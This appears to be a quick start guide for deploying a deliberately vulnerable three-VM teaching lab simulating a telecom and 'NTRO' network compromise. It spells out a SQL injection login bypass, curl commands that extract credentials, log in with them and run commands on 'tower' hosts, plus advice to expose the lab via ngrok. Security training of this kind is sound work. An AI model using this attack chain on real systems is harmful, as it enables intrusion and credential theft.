# 🚀 Quick Start Guide - 3 VM Distributed Deployment

## ⚡ **Super Fast Deployment (5 Minutes)**

### **Step 1: Verify VM Access**
```bash
# Test SSH to all VMs
ssh ubuntu@192.168.15.151 "echo VM1 OK"
ssh ubuntu@192.168.15.89 "echo VM2 OK"
ssh ubuntu@192.168.15.120 "echo VM3 OK"
```

### **Step 2: Run Automated Deployment**
```bash
cd distributed-deployment-3vm
chmod +x deploy-all.sh
./deploy-all.sh
```

**That's it!** The script will:
- Install Docker Compose on each VM
- Copy all files
- Build containers
- Start services
- Configure firewalls

---

## 🎯 **Access Points (After Deployment)**

### **Start Here - Customer Portal**
```
http://192.168.15.120:9090

SQL Injection:
  Username: ' OR '1'='1'--
  Password: anything
```

### **SQL Console (Extract Credentials)**
```
http://192.168.15.120:9090/api/query

Query: SELECT * FROM admin_credentials
```

### **NTRO Portal (Use Stolen Credentials)**
```
http://192.168.15.151:8080

Login: admin / admin123 (from SQL injection)
```

---

## 🔥 **Complete Attack in 2 Minutes**

```bash
# 1. SQL Injection to get database access
curl -X POST http://192.168.15.120:9090/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1'\''--","password":"x"}'

# 2. Extract NTRO credentials
curl -X POST http://192.168.15.120:9090/api/execute_query \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM admin_credentials"}'

# 3. Login to NTRO portal
curl -X POST http://192.168.15.151:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 4. Access classified towers
curl http://192.168.15.151:8080/api/towers

# 5. Execute command on tower
curl -X POST http://192.168.15.151:8001/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"cat secrets.txt"}'
```

---

## 📊 **What Each VM Does**

| VM | IP | Purpose | Ports |
|----|----|----|-------|
| **VM1** | 192.168.15.151 | NTRO Portal + 6 Towers | 8080, 8001-8006 |
| **VM2** | 192.168.15.89 | PostgreSQL Database | 5432, 5050 |
| **VM3** | 192.168.15.120 | Customer Portal (Vulnerable) | 9090 |

---

## 🛠️ **Manual Deployment (If Automated Fails)**

### **VM1 (Core + Towers)**
```bash
cd vm1-core-towers
scp -r * ubuntu@192.168.15.151:~/sim/
ssh ubuntu@192.168.15.151
cd ~/sim && sudo bash install.sh
```

### **VM2 (Database)**
```bash
cd vm2-database
scp -r * ubuntu@192.168.15.89:~/sim/
ssh ubuntu@192.168.15.89
cd ~/sim && sudo bash install.sh
```

### **VM3 (Customer Portal)**
```bash
cd vm3-customer-portal
scp -r * ubuntu@192.168.15.120:~/sim/
ssh ubuntu@192.168.15.120
cd ~/sim && sudo bash install.sh
```

---

## ❗ **Common Issues**

### **Cannot SSH to VM**
```bash
# Add SSH key
ssh-copy-id ubuntu@192.168.15.151

# Or enable password authentication
# On VM: sudo nano /etc/ssh/sshd_config
# Set: PasswordAuthentication yes
# Then: sudo systemctl restart ssh
```

### **Port Already in Use**
```bash
# Stop any existing containers
docker stop $(docker ps -q)
docker rm $(docker ps -aq)

# Then re-run install.sh
```

### **Docker Not Installed**
```bash
# Install Docker first
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER
```

---

## 🎓 **Demo Flow for Students**

1. **Show Customer Portal** (VM3)
   - Normal login fails
   - SQL injection bypasses authentication

2. **Access SQL Console**
   - Show database structure
   - Execute: `SELECT * FROM admin_credentials`
   - **Highlight: Credentials stored in customer DB!**

3. **Lateral Movement to NTRO**
   - Use extracted `admin/admin123`
   - Access classified portal

4. **Infrastructure Compromise**
   - Click towers on map
   - Open terminals
   - Execute system commands

5. **Discuss Security Lessons**
   - Never mix credential stores
   - Always sanitize SQL inputs
   - Implement proper access controls
   - Network segmentation importance

---

## 🔄 **Update/Restart Services**

```bash
# On any VM
ssh ubuntu@192.168.15.XXX
cd ~/attack-simulation
docker-compose restart

# Or rebuild after code changes
docker-compose up -d --build
```

---

## 🗑️ **Complete Cleanup**

```bash
# On each VM
ssh ubuntu@192.168.15.XXX
cd ~/attack-simulation
docker-compose down -v
rm -rf ~/attack-simulation
```

---

## 📱 **Mobile/Remote Access**

If demonstrating remotely, expose via:
- **SSH Tunnel**: `ssh -L 8080:localhost:8080 ubuntu@192.168.15.151`
- **VPN**: Connect all devices to same network
- **ngrok**: `ngrok http 8080` (for temporary public access)

---

## ✅ **Verification Checklist**

After deployment, verify:
- [ ] VM1 Core Portal loads: http://192.168.15.151:8080
- [ ] VM1 Towers respond: http://192.168.15.151:8001-8006
- [ ] VM2 Database accessible: `psql -h 192.168.15.89 -U telecom_admin`
- [ ] VM2 pgAdmin loads: http://192.168.15.89:5050
- [ ] VM3 Customer Portal loads: http://192.168.15.120:9090
- [ ] VM3 SQL Console loads: http://192.168.15.120:9090/api/query
- [ ] SQL Injection works
- [ ] Credentials extracted
- [ ] NTRO login works with stolen creds
- [ ] Tower terminals functional

---

**Need help? Check logs: `docker-compose logs -f`**

